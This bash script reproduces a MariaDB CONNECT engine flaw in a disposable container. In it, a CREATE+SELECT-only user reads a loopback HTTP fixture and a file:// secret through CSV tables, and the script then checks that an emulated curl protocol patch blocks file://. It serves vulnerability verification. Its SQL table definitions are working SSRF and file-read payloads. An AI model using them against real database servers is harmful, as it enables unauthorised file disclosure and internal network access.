#!/usr/bin/env bash
set -Eeuo pipefail

ROOT="$(cd "$(dirname "$0")" && pwd)"
IMAGE_TAG="mariadb-connect-rest-ssrf:test"
CONTAINER="mariadb-connect-rest-ssrf-$RANDOM"
ROOT_PASSWORD="test-only-root-password"
LOW_PASSWORD="test-only-low-password"
MARIADB_IMAGE="${MARIADB_IMAGE:-mariadb:11.8}"
LOG_DIR="$ROOT/results"
mkdir -p "$LOG_DIR"
rm -f "$LOG_DIR"/*.log

cleanup() {
  docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
}
trap cleanup EXIT

command -v docker >/dev/null || { echo "docker is required" >&2; exit 2; }

echo "[build] image=$MARIADB_IMAGE"
docker build --build-arg "MARIADB_IMAGE=$MARIADB_IMAGE" -t "$IMAGE_TAG" "$ROOT"

echo "[start] isolated MariaDB container"
docker run -d --name "$CONTAINER" \
  -e "MARIADB_ROOT_PASSWORD=$ROOT_PASSWORD" \
  "$IMAGE_TAG" >/dev/null

ready=0
for _ in $(seq 1 90); do
  if docker exec "$CONTAINER" mariadb-admin --protocol=tcp -h127.0.0.1 \
      -uroot "-p$ROOT_PASSWORD" ping --silent >/dev/null 2>&1; then
    ready=1
    break
  fi
  if [[ "$(docker inspect -f '{{.State.Running}}' "$CONTAINER" 2>/dev/null || echo false)" != "true" ]]; then
    break
  fi
  sleep 2
done
if [[ "$ready" -ne 1 ]]; then
  docker logs "$CONTAINER" >"$LOG_DIR/startup.log" 2>&1 || true
  cat "$LOG_DIR/startup.log"
  echo "FAIL: MariaDB did not become ready" >&2
  exit 1
fi

docker exec "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -uroot "-p$ROOT_PASSWORD" -e "
SELECT VERSION() AS tested_version;
SELECT PLUGIN_NAME, PLUGIN_STATUS FROM information_schema.PLUGINS
 WHERE PLUGIN_NAME='CONNECT';
" | tee "$LOG_DIR/server-info.log"

# Harmless HTTP fixture bound only to 127.0.0.1 inside this disposable container.
docker exec "$CONTAINER" sh -c '
  mkdir -p /tmp/rest-ssrf-fixture
  printf "LOCAL_HTTP_FIXTURE_MARKER,ok\\n" > /tmp/rest-ssrf-fixture/probe.csv
  printf "LOCAL_FILE_SECRET_MARKER,do-not-disclose\\n" > /tmp/rest-ssrf-fixture/secret.csv
  chown -R mysql:mysql /tmp/rest-ssrf-fixture
  chmod 600 /tmp/rest-ssrf-fixture/secret.csv
  (cd /tmp/rest-ssrf-fixture && nohup python3 -m http.server 18765 --bind 127.0.0.1 >/tmp/rest-ssrf-http.log 2>&1 </dev/null &)
'

http_ready=0
for _ in $(seq 1 20); do
  if docker exec "$CONTAINER" python3 -c \
    'import urllib.request; urllib.request.urlopen("http://127.0.0.1:18765/probe.csv", timeout=1).read()' \
    >/dev/null 2>&1; then
    http_ready=1
    break
  fi
  sleep 1
done
if [[ "$http_ready" -ne 1 ]]; then
  docker exec "$CONTAINER" cat /tmp/rest-ssrf-http.log || true
  echo "FAIL: loopback HTTP fixture did not start" >&2
  exit 1
fi

docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -uroot "-p$ROOT_PASSWORD" <<SQL
CREATE DATABASE appdb;
CREATE USER 'rest_low'@'%' IDENTIFIED BY '$LOW_PASSWORD';
GRANT CREATE, SELECT ON appdb.* TO 'rest_low'@'%';
FLUSH PRIVILEGES;
SQL

grants="$(docker exec "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -uroot "-p$ROOT_PASSWORD" -N -e "SHOW GRANTS FOR 'rest_low'@'%';")"
printf "%s\n" "$grants" | tee "$LOG_DIR/lowpriv-grants.log"
if printf "%s\n" "$grants" | grep -Eiq '(^|[, ])(FILE|SUPER)([, ;]|$)'; then
  echo "FAIL: test account unexpectedly has FILE or SUPER" >&2
  exit 1
fi
echo "[PASS] low-privilege account has CREATE and SELECT only (no FILE/SUPER)"

# Test A: empty FILE_NAME allows an authenticated CREATE+SELECT-only user to fetch loopback HTTP.
set +e
http_output="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
CREATE TABLE http_probe (
  value VARCHAR(512)
) ENGINE=CONNECT TABLE_TYPE=CSV
  HTTP='http://127.0.0.1:18765/probe.csv' SEP_CHAR=',';
SELECT value FROM http_probe;
SQL
  2>&1)"
http_rc=$?
set -e
printf "%s\n" "$http_output" | tee "$LOG_DIR/loopback-http-before-wrapper.log"
docker exec "$CONTAINER" cat /tmp/rest-ssrf-http.log >"$LOG_DIR/http-listener-before-wrapper.log" 2>&1 || true
if [[ "$http_rc" -ne 0 ]] || ! printf '%s' "$http_output" | grep -Fq "LOCAL_HTTP_FIXTURE_MARKER"; then
  echo "FAIL: low-privilege REST table did not retrieve the loopback HTTP fixture" >&2
  exit 1
fi
echo "[PASS] loopback HTTP request succeeded with no FILE/SUPER"

# Test B: reproduce the original, unpatched file:// behavior on the 11.8.9 image.
set +e
file_before="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
CREATE TABLE file_probe_before (
  value VARCHAR(512)
) ENGINE=CONNECT TABLE_TYPE=CSV
  HTTP='file:///tmp/rest-ssrf-fixture/secret.csv' SEP_CHAR=',';
SELECT value FROM file_probe_before;
SQL
  2>&1)"
file_before_rc=$?
set -e
printf "%s\n" "$file_before" | tee "$LOG_DIR/file-protocol-before-wrapper.log"
if ! printf '%s' "$file_before" | grep -Fq "LOCAL_FILE_SECRET_MARKER"; then
  echo "FAIL: expected the unpatched 11.8.9 image to reproduce the file:// read" >&2
  exit 1
fi
echo "[PASS] original 11.8.9 path reproduced the FILE read (client rc=$file_before_rc)"

# Negative control: a non-empty FILE_NAME must hit the FILE privilege gate.
set +e
acl_output="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
CREATE TABLE file_acl_control (
  value VARCHAR(512)
) ENGINE=CONNECT TABLE_TYPE=CSV
  FILE_NAME='file-acl-control.csv'
  HTTP='http://127.0.0.1:18765/probe.csv' SEP_CHAR=',';
SQL
  2>&1)"
acl_rc=$?
set -e
printf "%s\n" "$acl_output" | tee "$LOG_DIR/file-privilege-control.log"
if [[ "$acl_rc" -eq 0 ]] || ! grep -Fq "ERROR 1227" <<<"$acl_output"; then
  echo "FAIL: non-empty FILE_NAME did not enforce the FILE privilege check" >&2
  exit 1
fi
echo "[PASS] non-empty FILE_NAME is denied without FILE privilege"

# Emulate the exact curl restriction added by MDEV-41641 in a wrapper.
# The installed MariaDB 11.8.9 image predates that source patch, so the wrapper
# lets us exercise the patched curl invocation through the real CONNECT code path.
curl_path="$(docker exec "$CONTAINER" sh -c 'command -v curl' | tr -d '\r')"
real_curl_path="${curl_path}.real"
wrapper="$LOG_DIR/curl-proto-wrapper.sh"
cat >"$wrapper" <<EOF
#!/bin/sh
exec "$real_curl_path" --proto '=http,https' "\$@"
EOF
docker exec "$CONTAINER" cp "$curl_path" "$real_curl_path"
docker cp "$wrapper" "$CONTAINER:$curl_path"
docker exec "$CONTAINER" chmod 755 "$curl_path"
echo "[info] curl wrapper: $curl_path -> $real_curl_path --proto =http,https"

set +e
wrapper_file_output="$(docker exec "$CONTAINER" "$curl_path" -o /tmp/rest-ssrf-file-probe -- file:///tmp/rest-ssrf-fixture/secret.csv 2>&1)"
wrapper_file_rc=$?
set -e
printf "%s\\n" "$wrapper_file_output" | tee "$LOG_DIR/curl-wrapper-file-probe.log"
if [[ "$wrapper_file_rc" -eq 0 ]] || ! printf '%s' "$wrapper_file_output" | grep -Eiq 'Protocol "file" disabled|Protocol file disabled'; then
  echo "FAIL: curl wrapper did not reject file:// directly" >&2
  exit 1
fi
echo "[PASS] curl wrapper rejects file:// directly"

# Test C: same real MariaDB/CONNECT path with the exact protocol restriction.
set +e
file_after="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
CREATE TABLE file_probe_after (
  value VARCHAR(512)
) ENGINE=CONNECT TABLE_TYPE=CSV
  HTTP='file:///tmp/rest-ssrf-fixture/secret.csv' SEP_CHAR=',';
SELECT value FROM file_probe_after;
SQL
  2>&1)"
file_after_rc=$?
set -e
printf "%s\n" "$file_after" | tee "$LOG_DIR/file-protocol-after-wrapper.log"
docker logs "$CONTAINER" >"$LOG_DIR/mariadb-container.log" 2>&1 || true
if printf '%s' "$file_after" | grep -Fq "LOCAL_FILE_SECRET_MARKER"; then
  echo "FAIL: file:// secret was still disclosed with the patched curl restriction" >&2
  exit 1
fi
if ! grep -Eiq 'Protocol "file" disabled|Protocol file disabled|curl failed' "$LOG_DIR/mariadb-container.log" "$LOG_DIR/file-protocol-after-wrapper.log"; then
  echo "FAIL: did not observe evidence that the file protocol was rejected" >&2
  exit 1
fi
echo "[PASS] patched curl restriction blocked file:// through CONNECT"

# Test D: the same patched curl restriction still permits a loopback HTTP request.
set +e
http_after="$(docker exec -i "$CONTAINER" mariadb --protocol=tcp -h127.0.0.1 \
  -urest_low "-p$LOW_PASSWORD" appdb --show-warnings <<'SQL'
CREATE TABLE http_probe_after (
  value VARCHAR(512)
) ENGINE=CONNECT TABLE_TYPE=CSV
  HTTP='http://127.0.0.1:18765/probe.csv' SEP_CHAR=',';
SELECT value FROM http_probe_after;
SQL
  2>&1)"
http_after_rc=$?
set -e
printf "%s\n" "$http_after" | tee "$LOG_DIR/loopback-http-after-wrapper.log"
if [[ "$http_after_rc" -ne 0 ]] || ! printf '%s' "$http_after" | grep -Fq "LOCAL_HTTP_FIXTURE_MARKER"; then
  echo "FAIL: expected patched curl invocation to keep loopback HTTP available" >&2
  exit 1
fi
echo "[PASS] patched curl restriction still permits loopback HTTP SSRF"

echo
echo "RESULT: all expected outcomes observed."
echo "- Original MariaDB 11.8.9: loopback HTTP and file:// both reachable with CREATE+SELECT only."
echo "- With the MDEV-41641 curl protocol restriction emulated: file:// blocked."
echo "- With that same restriction: loopback HTTP still reachable."
echo "- Non-empty FILE_NAME continues to require FILE privilege."
echo "Scope: controlled 127.0.0.1 listener and disposable test container only; no cloud metadata or external internal hosts."
